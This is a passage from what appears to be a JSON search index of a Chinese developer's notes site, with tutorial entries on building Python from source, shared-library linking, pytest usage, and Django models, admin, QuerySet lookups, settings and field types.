lzma lzma-dev tk-dev uuid-dev zlib1g-dev sudo mkdir /usr/local/python37 ./configure --prefix=/usr/local/python37 --with-pydebug --enable-optimizations make -j 3 sudo make altinstall 使用源码安装最麻烦的是依赖包处理. 比如Ubuntu20, 官方源的Python绑定是3.8的版本. 如果 想要安装Python3.7, 那么你会发现至少缺少Python3.7-dev, 且源里面没有也下载不了. 注: python-dev or python-devel 称为 Python 的开发包，包括了一些用 C / Java / C# 等编写的 Python 扩展， 在编译的时候依赖的头文件等信息。在编译一个用 C 语言编写的 Python 扩展模块时， 里面会有 #include<Python.h> 这样的语句，因此需要先安装 python-dev or python-devel 开发包. 这种情况下要么换个有此包的源然后下载, 但是可能也会有其他依赖包版本问题, 要换直接去支持版本的机器上 全量编一个. Ubuntu 下名称 python-dev and python3-dev CentOS 下名称 python-devel and python3-devel 关于动态库链接处理 当时候从其他机器编译的Python时, 若需要的动态库在本机不存在, 还需要处理 动态库链接, 有几种方式(任选其一): 将so文件所在目录如 /usr/local/lib 添加到 /etc/ld.so.conf 并运行ldconfig. 当然，这是系统范围的设置. 将动态链接库文件(.so文件)复制到/usr/local/lib 或 /usr/lib, 然后执行 sudo ldconfig 更新系统动态链接库缓存. 将共享库放在统一的位置如 path/to/libs, 然后将其加入环境变量: export LD_LIBRARY_PATH=path/to/libs:$LD_LIBRARY_PATH 如果要永久生效就需要加到如 /etc/profile 打印 LD_LIBRARY_PATH 的值, 会发现 /usr/local/lib 或 /usr/lib 并不在这个 变量中, 这是因为, 这两目录是默认的共享库搜索路径. 即使未将该目录添加到 LD_LIBRARY_PATH 环境变量中，操作系统也会自动搜索该目录以查找所需的共享库 警告 对于Ubuntu等, /usr/bin/python 是与其他指令息息相关的, 比如 pip, lsb-release 等. 所以若自定义源码安装的版本与自带版本不一致时, 最好还是采用设置环境变量来处理执行命令的问题, 而不是直接修改 /usr/bin/python 的链接地址.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Installation-from-the-source-code.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Installation-from-the-source-code.html"},{"title":"Pytest使用","text":"搜索范围 先找到当前目录下以test_为前缀和以_test为后缀的文件, 然后在其中搜索: 以test为前缀的函数 以Test为前缀的类(注意一般测试类不应包含__init__()函数)中以test为前缀的函数 继承unittest.TestCase单元测试类中, 以test为前缀的函数 选项参数 -v , -q 打印用例执行的详细/简略过程, pytest -v , pytest -q -k 指定具体执行哪一个测试用例, 可以是文件名, 也可以是函数名, 都有则需要严格指定py文件名 -x 测试用例执行失败则立刻停止 -s 需要执行 print 函数, 默认不执行 -r <option> 生成简略的指定需求的报告, 支持参数如下 option Des f failed E error s skipped x xfailed X passed P passed p passed with output a all except passed A all --tb= <option> option: 'auto', 'long', 'short', 'no', 'line', 'native' 用例运行失败时, 展示错误的详细程度 -l , --showlocals 用例运行失败时, 打印相关的局部变量, pytest -l --lf , --last-failed 只执行上次执行失败的测试 --ff , --failed-first 先执行完上次失败的测试后, 再执行上次正常的测试 --durations= <num> num为0时则倒序显示所有的用例, 为具体值则显示耗时最长的对应该数量的用例, -vv 显示持续时间为0秒的用例 会按用例执行耗时时长：从长到短 显示结果, 用于调优测试代码 比如显示运行耗时最长的3个用例且包含持续时间为0秒的：pytest --durations=3 -vv --maxfail= <num> 用例运行时 允许的最大失败次数, 超过则立即停止, pytest --maxfail=3 --collect-only 收集测试用例但不执行 -n <num> 当使用pytest-xdist插件时, 可以指定运行处理器进程数, 可为个数或者'auto' --cov= <path> 统计指定路径的代码测试覆盖率, 需要先安装cov模块: pip install pytest-cov --cov-report= <TYPE> 生成指定格式的测试报告, 支持多个值, 支持以下测试报告类型: term, term-missing, annotate, html, xml 技巧 运行指定的函数 pytest 模块名::类名::函数名, pytest test.py::check_ui 注解 代码内部执行 if __name__ == '__main__' : pytest . main () 支持的装饰器 支持的其他 rerunfailure 失败重跑 安装, pip install pytest-rerunfailure 在设置文件pytest.ini中添加命令 reruns = 重跑次数 addopts= --reruns =10 参见: /docs/后端/python/python三方库/pytest-rerunfailures 使用Mock模拟对象 使用mock对象替代掉指定的python对象, 以达到模拟对象的行为的目的。 可以用在测试时, 存在一些依赖对象时, 使用mock模拟一些依赖对象; 也可以用在存在接口调用但接口未完善时. from unittest.mock import Mock something = Mock () something . do = lambda * args : True 其他见: /docs/后端/python/python三方库/pytest 关于装饰器的一些使用 有此节主要是因为, 有需求需要将一个固件重用, 但是变动的地方很小 引入需要用到的模块: import pytest from _pytest.fixtures import SubRequest from _pytest.mark import Mark 定义一个r_server固件, 作用范围为方法域, yield表示会先在yield处返回给测试函数执行直到其结束: @pytest.fixture(scope='function') def r_server(request: SubRequest): print() k_kwargs = {k: v for k, v in request.keywords.items()} print( f'keywords: {k_kwargs}', sep='\\n') yield k_kwargs print('end') 其中, request是一个特殊的fixture，它提供了有关当前测试运行上下文的信息. 传递多个普通参数, 给了几组参数就会执行几次当前测试: @pytest.mark.parametrize( \"param1, param2\", # 参数字符串, 注意, 这些参数需要在修饰的方法中定义, # 如此处的 test_r_use_params(param1, param2 [ ('p1', 'p2'), # 第一组参数 ('p2', 'p3'), # 第二组参数 ('p5', 'p4'), # 第三组参数 # 多组参数表示执行多次, 每次使用不同的参数 # 这里三组会执行三次, 每次使用本次参数 ], # indirect=['r_server'], # 要传递的fixture name的list, # 指定哪些个固件使用这些参数 ) def test_r_use_params(param1, param2, r_server): result: dict = r_server assert 'parametrize' in result _a: Mark = result['parametrize'] assert _a.args == ('param1, param2', [('p1', 'p2'), ('p2', 'p3'), ('p5', 'p4')]) 这里原本想用 indirect 来指定固件, 不知道为什么使用 indirect 会导致找不到固件而执行失败, 所以放弃. 传递关键字参数: # 这里表示传递给 r_server 关键字参数 # 这里实际传入的是: 'name': Mark(name='name', *args, **kwargs) @pytest.mark.key_word_one('1') @pytest.mark.key_word_two('2') def test_r_use_keywords(r_server): result: dict = r_server assert 'key_word_one' in result assert type(_a := result['key_word_one']) == Mark and _a.args[0] == '1' assert 'key_word_two' in result assert type(_a := result['key_word_two']) == Mark and _a.args[0] == '2' 可以看出, 不论是关键字参数还是普通参数, 其实都会被 Mark 修饰, 存储到 request.keywords 内.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Pytest.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Pytest.html"},{"title":"多个目录下的三方包整合","text":"有以下方式 将路径直接添加到sys.path 将路径加入到环境变量 PYTHONPATH 在当前三方包路径下创建一个 .pth 后缀的文件, 然后将路径按行写入 详见: 将文件夹加入到sys.path","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Three--party-package-integration-in-multiple-directory.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Three--party-package-integration-in-multiple-directory.html"},{"title":"抽象基类-定义公共字段","text":"抽象基类在你要将公共信息放入很多模型时会很有用。 编写你的基类，并在 Meta 类中填入 abstract=True . 该模型将不会创建任何数据表。当其用作其它模型类的基类时，它的字段会自动添加至子类。 如: from django.db import models class CommonInfo(models.Model): name = models.CharField(max_length=100) age = models.PositiveIntegerField() class Meta: abstract = True class Student(CommonInfo): home_group = models.CharField(max_length=5) Student 模型拥有3个字段： name ， age 和 home_group 。 CommonInfo 模型不能用作普通的 Django 模型， 因为它是一个抽象基类。它不会生成数据表，也没有管理器，也不能被实例化和保存。 从抽象基类继承来的字段可被其它字段或值重写，或用 None 删除。 对很多用户来说，这种继承可能就是你想要的。它提供了一种在 Python 级抽出公共信息的方法，但仍会在子类模型中创建数据表。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Abstract-base.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Abstract-base.html"},{"title":"应用打包","text":"使用 setuptools 打包 建立一个文件夹放模块 将模块目录移入这个新建的目录 在新建目录下创建一个 README.rst 文件， 包含以下内容: rst ===== Polls ===== Polls is a Django app to conduct Web-based polls. For each question, visitors can choose between a fixed number of answers. Detailed documentation is in the \"docs\" directory. Quick start ----------- 1. Add \"polls\" to your INSTALLED_APPS setting like this:: INSTALLED_APPS = [ ... 'polls', ] 2. Include the polls URLconf in your project urls.py like this:: path('polls/', include('polls.urls')), 3. Run ``python manage.py migrate`` to create the polls models. 4. Start the development server and visit http://127.0.0.1:8000/admin/ to create a poll (you'll need the Admin app enabled). 5. Visit http://127.0.0.1:8000/polls/ to participate in the poll. 在同一目录下创建 LICENSE 文件。选择一个授权协议（这里暂时不知道怎么搞） 创建 setup.cfg 和 setup.py 说明构建与安装的细节。可参考 setuptools docs 大致包含以下内容 setup.cfg: [metadata] name = django-polls version = 0.1 description = A Django app to conduct Web-based polls. long_description = file: README.rst url = https://www.example.com/ author = Your Name author_email = yourname@example.com license = BSD-3-Clause # Example license classifiers = Environment :: Web Environment Framework :: Django Framework :: Django :: X.Y # Replace \"X.Y\" as appropriate Intended Audience :: Developers License :: OSI Approved :: BSD License Operating System :: OS Independent Programming Language :: Python Programming Language :: Python :: 3 Programming Language :: Python :: 3 :: Only Programming Language :: Python :: 3.6 Programming Language :: Python :: 3.7 Programming Language :: Python :: 3.8 Topic :: Internet :: WWW/HTTP Topic :: Internet :: WWW/HTTP :: Dynamic Content [options] include_package_data = true packages = find: python_requires = >=3.6 install_requires = Django >= X.Y # Replace \"X.Y\" as appropriate setup.py: from setuptools import setup setup() 默认情况，包中仅包含 Python 模块和包。 要包含其他文件，我们需要创建一个`MANIFEST.in` 文件。 上一步中提到的 setuptools 文档更详细地讨论了这个文件。 要包含模板、 README.rst 和我们的 LICENSE 文件，创建一个文件 MANIFEST.in ，其内容如下: include LICENSE include README.rst recursive-include polls/static * recursive-include polls/templates * 在应用中包含详细文档是可选的，但我们推荐你这样做。新建目录下创建一个空目录 docs 用于未来编写文档。 额外添加一行至 MANIFEST.in : recursive-include docs * 注意，现在 docs 目录不会被加入你的应用包，除非你往这个目录加几个文件。 许多 Django 应用也提供他们的在线文档通过类似 readthedocs.org 这样的网站。 试着构建你自己的应用包通过 ptyhon setup.py sdist（在 django-polls 目录内）。 这将创建一个名为 dist 的目录并构建你自己的应用包， django-polls-0.1.tar.gz 。 更多关于打包的信息，见 Python 的 关于打包和发布项目的教程","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Apply.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Apply.html"},{"title":"后台管理模块admin","text":"这里其实对应的就是 应用中的 admin.py 常用字段 例子: from django.contrib import admin from .models import Question class QuestionAdmin(admin.ModelAdmin): fieldsets = [ (None, {'fields': ['question_text']}), ('Date information', {'fields': ['pub_date']}), ] admin.site.register(Question, QuestionAdmin) 可以自行设置自定义的后台表单如例所示，自定义的类需要 register 在基类之后的类中字段定义方法 fields 如: fields = ['pub_date', 'question_text'] 表示前台直接展示的字段以及顺序 主要用于新增 fieldsets 如: fieldsets = [ (None, {'fields': ['question_text']}), ('Date information', {'fields': ['pub_date']}), ] 表示将这些字段分成几个字段集 其中每个元组中第一个元素表示这个集的标题 主要用于新增 list_display 如: list_display = ('question_text', 'pub_date') 表示在前台展示一个可视化的字段列表 主要用于表格化的展示 list_filter 如: list_filter = ['pub_date'] 表示允许在前端使用此字段的过滤选项（在侧边栏显示过滤选项） search_fields 如: search_fields = ['question_text'] 表示前端新增此字段的搜索框（后端将使用like查询） 自定义后台界面风格 通过 Django 的模板系统来修改 Django 的后台由自己驱动，且它的交互接口采用 Django 自己的模板系统。 在包含 manage.py 的工程目录内创建一个 templates 目录，放模板资源吧 在 settings.py 配置 DIRS选项 大致如下: TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [BASE_DIR / 'templates'], 'APP_DIRS': True, 'OPTIONS': { 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, }, ] TEMPLATES 作用 包含所有 Django 模板引擎的配置的列表。列表中的每一项都是一个字典，包含了各个引擎的选项。 DIRS 是一个包含多个系统目录的文件列表，用于在载入 Django 模板时使用，是一个待搜索路径。 参考:: 自定义后台表单","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Background-management-module-admin.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Background-management-module-admin.html"},{"title":"创建项目","text":"命令行: django-admin startproject $项目名","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Creation-project.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Creation-project.html"},{"title":"自定义sql","text":"使用: Manager.raw(raw_query,params=(),translations=None) 如: >>> Person.objects.raw('''SELECT first AS first_name, ... last AS last_name, ... bd AS birth_date, ... pk AS id, ... FROM some_other_table''') 带参: >>> lname = 'Doe' >>> Person.objects.raw('SELECT * FROM myapp_person WHERE last_name = %s', [lname]) 参考: 执行原生 SQL 查询 | Django 文档 | Django (djangoproject.com)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Custom-SQL.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Custom-SQL.html"},{"title":"F Q","text":"F F支持表内部字段的比较 单下划线 例如，为了查找comments数目多于pingbacks数目的Entry， 可以构造一个F()对象来引用pingback数目，并在查询中使用该F()对象： Entry有两个字段 number_of_comments，number_of_pingbacks: > from django.db.models import F > Entry.objects.filter(number_of_comments__gt=F('number_of_pingbacks')) > ps： 也支持加减乘除 如：查询rating比pingback和comment数目总和要小的Entry，可以这么写: > Entry.objects.filter(rating__lt=F('number_of_comments') + F('number_of_pingbacks')) F支持跨表查询 双下划线 在F()中使用双下划线来进行跨表查询。例如，查询author的名字与blog名字相同的Entry: > Entry.objects.filter(authors__name=F('blog__name')) F，更新时用于获取原来的值 如: from django.db.models import F,Q models.UserInfo.objects.all().update(age=F(\"age\")+1) Q，用于构造复杂查询条件 应用一: models.UserInfo.objects.filter(Q(id__gt=1)) models.UserInfo.objects.filter(Q(id=8) | Q(id=2)) models.UserInfo.objects.filter(Q(id=8) & Q(id=2)) 应用二: q1 = Q() q1.connector = 'OR' q1.children.append(('id__gt', 1)) q1.children.append(('id', 10)) q1.children.append(('id', 9)) q2 = Q() q2.connector = 'OR' q2.children.append(('c1', 1)) q2.children.append(('c1', 10)) q2.children.append(('c1', 9)) q3 = Q() q3.connector = 'AND' q3.children.append(('id', 1)) q3.children.append(('id', 2)) q2.add(q3,'OR') con = Q() con.add(q1, 'AND') con.add(q2, 'AND') models.UserInfo.objects.filter(con)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-FQ.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-FQ.html"},{"title":"QuerySet Api","text":"包含两个公开属性： ordered：查询时候是否有序（True/False） db：查询时使用的数据库 模型.objects的一些方法 每次执行都是返回一个新的QuerySet() 总览: module.objects.all() 获取该实例的所有信息 module.objects.add() 添加 module.objects.create() 创建 module.objects.get() module.objects.filter(*kargs) 过滤器 返回包含指定参数的QuerySet，底层通过AND连接多个参数 module.objects.exclude(*kargs) 返回不包含指定参数的QuerySet，底层是用NOT()包裹的AND module.objects.annotate() 聚合查询，对QuerySet的每个对象进行注解 module.objects.order_by() 排序 module.objects.annotate() module.objects.alias() 对QuerySet的每个字段设置别名，相当于as（没搞懂） module.objects.select_related() 会获取外键对应的对象，在需要的时候就不用重新查询数据库了（主要用于一对多字段的查询） module.objects.prefetch_related() 多对多字段的查询（通过外键所对应实体找外键所在实体），底层使用的in module.objects.reverse() 反向查询 module.objects.distinct( \\*fields ) 反向查询 module.objects.values() 返查询字典而不是实例 module.objects.defer() 单次加载时，指定不加载指定的字段，后续是需要时再加载 module.objects.only() 单次加载时，指定加载指定的字段，未指定的需要再加载 module.objects.extra() 所有查询操作参考: https://www.liujiangblog.com/course/django/129 module.objects.all() 获取该实例的所有信息 注意: Entry.objects.filter(pub_date__year=2006) 等价于: Entry.objects.all().filter(pub_date__year=2006) module.objects.add() 添加 module.objects.create() 创建 module.objects.get() 获取 module.objects.filter(*kargs) 过滤器 返回包含指定参数的QuerySet，底层通过AND连接多个参数 如果是多个filter，那么这些filter的链之间是或的关系（or） module.objects.exclude(*kargs) 返回不包含指定参数的QuerySet，底层是用NOT()包裹的AND module.objects.annotate() 聚合查询，对QuerySet的每个对象进行注解 module.objects.order_by() 排序 module.objects.alias() 对QuerySet的每个字段设置别名 好像相当于as（没搞懂） module.objects.select_related() 会获取外键对应的对象， 在需要的时候就不用重新查询数据库了（主要用于一对多字段的查询） module.objects.prefetch_related() 多对多字段的查询 (通过外键所对应实体找外键所在实体)，底层使用的in module.objects.reverse() 反向查询 module.objects.distinct(*fields ) 反向查询 module.objects.values() 反查询字典而不是实例 注意values与distinct使用会影响排序结果 module.objects.defer() 返回对象实例，指定不加载字段 单次加载时，指定不加载指定的字段，后续是需要时再加载 module.objects.only() 返回对象实例，指定加载字段 单次加载时，指定加载指定的字段，未指定的需要再加载 多个链式的only，只会以最后一个为准: > 比如:ret=Book.object.all().only('name') > id始终会查,结果是queryset对象,套book对象(里面只有id与name字段) > 问:如果取price,发生了什么? > 它会再次查询数据库,对数据库造成压力 extra(select=None, where=None, params=None, tables=None, order_by=None, select_params=None) 有时候，Django 查询语法本身并不能很容易地表达一个复杂的 WHERE 子句。 对于这些边缘情况，Django 提供了 extra() QuerySet 修饰符——用于将特定的子句注入到由 QuerySet 生成的 SQL 中。 如果在 extra() 调用之后使用 values() 子句， 则 extra() 中的 select 参数所定义的任何字段必须明确地包含在 values() 调用中。 任何在 values() 调用之后进行的 extra() 调用将忽略其额外选择的字段。 官网文档说计划 extra将在未来废弃 filter/other 过滤后的QuerySet都是唯一的 前缀为变量或者说字段名 后缀如下： __gt : 大于 __gte : 大于等于 __lt : 小于 __lte : 小于等于 __in : 其中之一 __range : 范围 __year : 日期-年 __exact ：\"精确\"匹配（区分大小写） __iexact ：是不区分大小写的匹配项 __contains ：区分大小写的模糊查询 __icontains ：不区分大小写的模糊查询，与`contains`相对应。 __startswith ：以什么开头的模糊查询（ 区分大小写 ） __istartswith ：以什么开头的模糊查询（ 不区分大小写 ） __endswith ：以什么结尾的模糊查询（ 区分大小写 ） __iendswith ：以什么结尾的模糊查询（ 不区分大小写 ） __isnull : 是空的 __regex : 区分大小写的正则匹配 __iregex : 不区分大小写的正则匹配","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-QuerySet-API.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-QuerySet-API.html"},{"title":"settings常用字段","text":"TEMPLATES 默认： [] （空列表） 一个包含所有 Django 模板引擎的配置的列表。列表中的每一项都是一个字典，包含了各个引擎的选项。 下面是一个配置，告诉 Django 模板引擎从每个安装好的应用程序中的 templates 子目录中加载模板: TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'APP_DIRS': True, }, ] 以下选项适用于所有后端。 BACKEND 默认：未定义 要使用的模板后端。内置的模板后端有： 'django.template.backends.django.DjangoTemplates' 'django.template.backends.jinja2.Jinja2' 你可以通过将 BACKEND 设置为一个完全限定的路径（例如 'mypackage.whatever.Backend' ）来使用一个不在 Django 中的模板后端。 NAME 默认：见下方 这个特定模板引擎的别称。它是一个标识符，允许选择一个引擎进行渲染。所有配置的模板引擎的别名必须是唯一的。 它默认为定义引擎类的模块名称，即 BACKEND 的下一个到最后一个，如果没有提供的话。例如，如果后端是 'mypackage.whatever.Backend' ，那么它的默认名称是 'whatever' 。 DIRS 默认： [] （空列表） 按照搜索顺序，引擎应该查找模板源文件的目录。 APP_DIRS 默认： False 引擎是否应该在已安装的应用程序中查找模板源文件。 注解 默认的 settings.py 文件由 django-admin startproject 创建，设置 'APP_DIRS': True 。 OPTIONS 默认值： {} （空字典） 要传递给模板后台的额外参数。根据模板后端的不同，可用的参数也不同。 参见 DjangoTemplates 和 Jinja2 了解内置后端的选项 参考: setting配置","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Settings-commonly-used-field.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Settings-commonly-used-field.html"},{"title":"AutoField","text":"一个 IntegerField，根据可用的 ID 自动递增。你通常不需要直接使用它；如果你没有指定，主键字段会自动添加到你的模型中。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Autofield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Autofield.html"},{"title":"BigAutoField","text":"一个 64 位整数，与 AutoField 很相似，但保证适合 1 到 9223372036854775807 的数字。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Bigautofield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Bigautofield.html"},{"title":"BigIntegerField","text":"一个 64 位的整数，和 IntegerField 很像，只是它保证适合从 -9223372036854775808 到 9223372036854775807 的数字。该字段的默认表单部件是一个 NumberInput。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Bigintegerfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Bigintegerfield.html"},{"title":"BinaryField","text":"一个用于存储原始二进制数据的字段。可以指定为 bytes、bytearray 或 memoryview。 默认情况下，BinaryField 将 ediditable` 设置为 False，在这种情况下，它不能被包含在 ModelForm 中。 BinaryField 有一个额外的可选参数： BinaryField.max_length The maximum length (in bytes) of the field. The maximum length is enforced in Django's validation using MaxLengthValidator. 滥用 BinaryField 虽然你可能会想到在数据库中存储文件，但考虑到这在99%的情况下是糟糕的设计。这个字段 不能 代替正确的 静态文件 处理。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Binaryfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Binaryfield.html"},{"title":"BooleanField","text":"一个 true／false 字段。 该字段的默认表单部件是 CheckboxInput，或者如果 null=True 则是 NullBooleanSelect。 当 Field.default 没有定义时，BooleanField 的默认值是 None。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Booleanfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Booleanfield.html"},{"title":"DateField","text":"一个日期，在 Python 中用一个 datetime.date 实例表示。有一些额外的、可选的参数。 DateField.auto_now 每次保存对象时，自动将该字段设置为现在。 对于\"最后修改\"的时间戳很有用。请注意，当前日期 总是 被使用，而不仅仅是一个你可以覆盖的默认值。 只有在调用 Model.save() 时，该字段才会自动更新。 当以其他方式对其他字段进行更新时，如 QuerySet.update()， 该字段不会被更新，尽管你可以在这样的更新中为该字段指定一个自定义值。 DateField.auto_now_add 当第一次创建对象时，自动将该字段设置为现在。 对创建时间戳很有用。请注意，当前日期是 始终 使用的； 它不是一个你可以覆盖的默认值。因此，即使你在创建对象时为该字段设置了一个值，它也会被忽略。 如果你想修改这个字段，可以设置以下内容来代替 auto_now_add=True ： 对于 DateField: default=date.today ——来自 datetime.date.today() 对于 DateTimeField: default=timezone.now ——来自 django.utils.timezone.now() 该字段的默认表单部件是一个 DateInput。管理中增加了一个 JavaScript 日历， 以及\"今天\"的快捷方式。包含一个额外的 invalid_date 错误信息键。 auto_now_add、auto_now 和 default 选项是相互排斥的。这些选项的任何组合都会导致错误。 注解 目前，将 auto_now 或 auto_now_add 设置为 True，将导致该字段设置为 editable=False 和 blank=True。 auto_now 和 auto_now_add 选项将始终使用创建或更新时 默认时区 的日期。 如果你需要一些不同的东西，你可能需要考虑使用你自己的可调用的默认值，或者覆盖 save() 而不是使用 auto_now 或 auto_now_add ； 或者使用 DateTimeField 而不是 DateField，并决定如何在显示时间处理从日期时间到日期的转换。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Datefield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Datefield.html"},{"title":"DateTimeField","text":"一个日期和时间，在 Python 中用一个 datetime.datetime 实例表示。与 DateField 一样，使用相同的额外参数: class DateTimeField(auto_now=False, auto_now_add=False, \\*\\*options) 该字段的默认表单部件是一个单独的 DateTimeInput。管理中使用两个单独的 TextInput 部件，并使用 JavaScript 快捷方式。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Datetimefield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Datetimefield.html"},{"title":"DecimalField","text":"一个固定精度的十进制数，在 Python 中用一个 Decimal 实例来表示。它使用 DecimalValidator 验证输入: class DecimalField(max_digits=None, decimal_places=None, **options) 有两个 必要的 参数： DecimalField.max_digits 数字中允许的最大位数。请注意，这个数字必须大于或等于 decimal_places。 DecimalField.decimal_places 与数字一起存储的小数位数。 例如，如果要存储精度为小数点后两位的 999 的数字，你可以使用: models.DecimalField(..., max_digits=5, decimal_places=2) 并以 10 位小数的精度来存储最多约 10 亿的数字: models.DecimalField(..., max_digits=19, decimal_places=10) 当 localize 为 False 时是 NumberInput 否则，该字段的默认表单部件是 TextInput。 注解 关于 FloatField 和 DecimalField 类之间差异的更多信息，请参见 FloatField vs. DecimalField。你还应该注意小数字段的 SQLite 限制。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Decimalfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Decimalfield.html"},{"title":"DurationField","text":"一个用于存储时间段的字段——在 Python 中用 timedelta 建模。 当在 PostgreSQL 上使用时，使用的数据类型是 interval， 在 Oracle 上使用的数据类型是 INTERVAL DAY(9) TO SECOND(6)。否则使用微秒的 bigint: class DurationField(**options) 注解 DurationField 的算术在大多数情况下是可行的。 但在 PostgreSQL 以外的所有数据库中，将 DurationField 的值与 DateTimeField 实例上的算术进行比较，将无法达到预期的效果。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-DurationField.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-DurationField.html"},{"title":"EmailField","text":"一个 CharField，使用 EmailValidator 来检查该值是否为有效的电子邮件地址: class EmailField(max_length=254, **options)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Emailfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Emailfield.html"},{"title":"FileField","text":"一个文件上传字段: class FileField(upload_to=None, max_length=100, \\*\\*options) 注解 primary_key 参数不支持，如果使用，会引起错误。 有两个可选参数： FileField.upload_to 这个属性提供了一种设置上传目录和文件名的方式，可以有两种设置方式。在这两种情况下，值都会传递给 Storage.save() 方法。 如果你指定一个字符串值或一个 Path，它可能包含 strftime() 格式， 它将被文件上传的日期／时间所代替（这样上传的文件就不会填满指定的目录）。例如: class MyModel(models.Model): # file will be uploaded to MEDIA_ROOT/uploads upload = models.FileField(upload_to='uploads/') # or... # file will be saved to MEDIA_ROOT/uploads/2015/01/30 upload = models.FileField(upload_to='uploads/%Y/%m/%d/') 如果你使用的是默认的 FileSystemStorage，这个字符串的值将被附加到你的 MEDIA_ROOT 路径后面， 形成本地文件系统中上传文件的存储位置。 如果你使用的是不同的存储系统，请检查该存储系统的文档，看看它是如何处理 upload_to 的。 upload_to 也可以是一个可调用对象，如函数。这个函数将被调用以获得上传路径，包括文件名。 这个可调用对象必须接受两个参数，并返回一个 Unix 风格的路径（带斜线），以便传给存储系统。这两个参数是： instance 定义 FileField 的模型实例。更具体地说，这是附加当前文件的特定实例。 在大多数情况下，这个对象还没有被保存到数据库，所以如果它使用默认的 AutoField，它的主键字段可能还没有一个值。 filename 最初给文件的文件名。在确定最终目标路径时，可能会考虑到，也可能不会考虑到。 例子: def user_directory_path(instance, filename): # file will be uploaded to MEDIA_ROOT/user_<id>/<filename> return 'user_{0}/{1}'.format(instance.user.id, filename) class MyModel(models.Model): upload = models.FileField(upload_to=user_directory_path) FileField.storage 一个存储对象，或是一个返回存储对象的可调用对象。它处理你的文件的存储和检索。参见 管理文件，了解如何提供这个对象。 Changed in Django 3.1: 增加了提供可调用对象的能力。 该字段的默认表单部件是一个 ClearableFileInput。 在模型中使用 FileField 或 ImageField （见下文）需要几个步骤： 在你的配置文件中，你需要定义 MEDIA_ROOT 作为你希望 Django 存储上传文件的目录的完整路径。 （为了保证性能，这些文件不存储在数据库中。） 定义 MEDIA_URL 作为该目录的基本公共 URL。确保这个目录是 Web 服务器的用户账号可以写的。 将 FileField 或 ImageField 添加到你的模型中，定义 upload_to 选项，指定 MEDIA_ROOT 的子目录，用于上传文件。 所有这些将被存储在你的数据库中的是一个文件的路径（相对于 MEDIA_ROOT ）。 你很可能要使用 Django 提供的方便的 url 属性。 例如，如果你的 ImageField 叫做 mug_shot，你可以在模板中使用 {{ object.mug_shot.url }} 获取图片的绝对路径。 例如，你的 MEDIA_ROOT 设置为 '/home/media'， upload_to 设置为 'photos/%Y/%m/%d'。 upload_to 中的 '%Y/%m/%d' 部分是 strftime() 格式化， '%Y' 是四位数的年，'%m' 是两位数的月，'%d' 是两位数的日。 如果你在 2007 年 1 月 15 日上传了一个文件，它将被保存在 /home/media/photos/2007/01/15 目录下。 如果你想检索上传文件的盘上文件名，或者文件的大小，可以分别使用 name 和 size 属性；关于可用属性和方法的更多信息， 请参见 File 类参考和 管理文件 主题指南。 注解 文件在数据库中作为保存模型的一部分，因此在模型被保存之前，不能依赖磁盘上使用的实际文件名。 上传的文件的相对 URL 可以通过 url 属性获得。内部调用底层 Storage 类的 store() 方法。 需要注意的是，无论何时处理上传的文件，你都应该密切关注你上传的文件在哪里， 